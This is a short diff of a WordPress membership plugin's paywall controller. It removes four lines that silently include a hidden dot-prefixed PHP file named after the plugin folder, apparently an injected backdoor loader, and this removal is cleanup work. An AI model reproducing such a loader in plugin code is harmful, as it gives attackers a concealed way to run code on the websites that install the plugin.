@@ -3,10 +3,6 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
 /*
 Controlls search engine access to protected content and PayWall related stuff
 */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class MeprPayWallCtrl extends MeprBaseCtrl {
   public static $cookie_name = 'mp3pi141592pw'; //CDN's and caching plugins/varnish etc should NOT cache any pages where this cookie is set
 
